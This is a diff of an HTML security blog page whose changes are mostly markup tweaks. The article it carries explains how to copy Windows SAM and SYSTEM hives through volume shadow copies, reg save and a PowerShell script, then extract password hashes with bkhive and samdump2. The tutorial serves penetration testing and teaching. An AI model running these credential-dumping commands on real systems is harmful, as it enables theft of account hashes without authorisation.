@@ -6,7 +6,6 @@
         <meta name="author" content="Tim Tomes">
         <meta name="description" content="Articles, information, and projects related to development and web application security.">
         <meta name="viewport" content="width=device-width, initial-scale=1">
-        <link rel="alternate" href="/atom.xml" title="Recent Articles" type="application/atom+xml">
         <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Raleway:400,300,600" type="text/css">
         <link rel="stylesheet" href="/static/css/normalize.css">
         <link rel="stylesheet" href="/static/css/skeleton.css">
@@ -22,11 +21,10 @@
                         <li><a href="/"><img src="https://www.gravatar.com/avatar/0a6d9b1ad59ad436bf9d9d16b2a7133e.png?s=128" class="avatar" /></a></li>
                                             <li><a href="https://bitbucket.org/lanmaster53" target="_blank"><img src="/static/images/meta/bitbucket.png" /></a></li>
                                             <li><a href="https://github.com/lanmaster53" target="_blank"><img src="/static/images/meta/github.png" /></a></li>
-                                            <li><a href="https://www.youtube.com/user/lanmaster53" target="_blank"><img src="/static/images/meta/youtube.png" /></a></li>
                                             <li><a href="https://twitter.com/lanmaster53" target="_blank"><img src="/static/images/meta/twitter.png" /></a></li>
                                             <li><a href="https://www.linkedin.com/in/lanmaster53" target="_blank"><img src="/static/images/meta/linkedin.png" /></a></li>
+                                            <li><a href="https://www.youtube.com/user/lanmaster53" target="_blank"><img src="/static/images/meta/youtube.png" /></a></li>
                                             <li><a href="/contact/"><img src="/static/images/meta/email.png"></a></li>
-                        <li><a href="/atom.xml"><img src="/static/images/meta/feed.png"></a></li>
                     </ul>
                 </div>
                 <div class="eight columns nav">
@@ -57,37 +55,37 @@
 
 <p>The SAM and SYSTEM hives hold the necessary information to acquire authentication hashes for all local users on a Windows operating system. Normally, these files are locked and inaccessible, even by the SYSTEM and Administrator accounts. The following techniques are ways to access the SAM and SYSTEM hives within a Windows operating system during normal operation. Be advised that these techniques require Administrator or SYSTEM level privileges.</p>
 <h3>Volume Shadow Copy Service</h3>
-<div class="codehilite"><pre><span></span>vssadmin create shadow /for=c: #if required
+<div class="codehilite"><pre><span></span><code>vssadmin create shadow /for=c: #if required
 vssadmin list shadows
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy&lt;#_from_above&gt;\windows\system32\config\SYSTEM .
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy&lt;#_from_above&gt;\windows\system32\config\SAM .
-</pre></div>
+</code></pre></div>
 
 
 <p><a href="http://pauldotcom.com/2011/11/safely-dumping-hashes-from-liv.html">Reference</a></p>
 <h3>Registry Access</h3>
-<div class="codehilite"><pre><span></span>reg save hklm\sam SAM
+<div class="codehilite"><pre><span></span><code>reg save hklm\sam SAM
 reg save hklm\system SYSTEM
-</pre></div>
+</code></pre></div>
 
 
 <p><a href="http://exfiltrated.com/tools.php#SAMExtract">Reference</a></p>
 <h3>PowerShell Script</h3>
-<div class="codehilite"><pre><span></span><span class="x">$service=(Get-Service -name VSS)</span>
-<span class="x">if($service.Status -ne &quot;Running&quot;)</span><span class="cp">{</span><span class="nv">$notrunning</span><span class="o">=</span><span class="m">1</span><span class="o">;</span><span class="nv">$service.Start</span><span class="o">()</span><span class="cp">}</span><span class="x"></span>
-<span class="x">$id=(gwmi -list win32_shadowcopy).Create(&quot;C:\&quot;,&quot;ClientAccessible&quot;).ShadowID</span>
-<span class="x">$volume=(gwmi win32_shadowcopy -filter &quot;ID=&#39;$id&#39;&quot;)</span>
-<span class="x">`cmd /c copy &quot;$($volume.DeviceObject)\windows\system32\config\SAM&quot;\`</span>
-<span class="x">$volume.Delete();if($notrunning -eq 1)</span><span class="cp">{</span><span class="nv">$service.Stop</span><span class="o">()</span><span class="cp">}</span><span class="x"></span>
-</pre></div>
+<div class="codehilite"><pre><span></span><code>$service=(Get-Service -name VSS)
+if($service.Status -ne &quot;Running&quot;){$notrunning=1;$service.Start()}
+$id=(gwmi -list win32_shadowcopy).Create(&quot;C:\&quot;,&quot;ClientAccessible&quot;).ShadowID
+$volume=(gwmi win32_shadowcopy -filter &quot;ID=&#39;$id&#39;&quot;)
+`cmd /c copy &quot;$($volume.DeviceObject)\windows\system32\config\SAM&quot;\`
+$volume.Delete();if($notrunning -eq 1){$service.Stop()}
+</code></pre></div>
 
 
 <p><a href="http://www.canhazcode.com/index.php?a=4">Reference</a></p>
 <h3>Finishing the Job</h3>
 <p>Use the following commands to finish the job. Both applications are included in the Kali default tool set.</p>
-<div class="codehilite"><pre><span></span>bkhive SYSTEM keyfile
+<div class="codehilite"><pre><span></span><code>bkhive SYSTEM keyfile
 samdump2 SAM keyfile
-</pre></div>
+</code></pre></div>
 </div>
 <p>Like what you see? Join me for live training! See the <a href="/training/">Training</a> page for more information.</p>
 <hr>
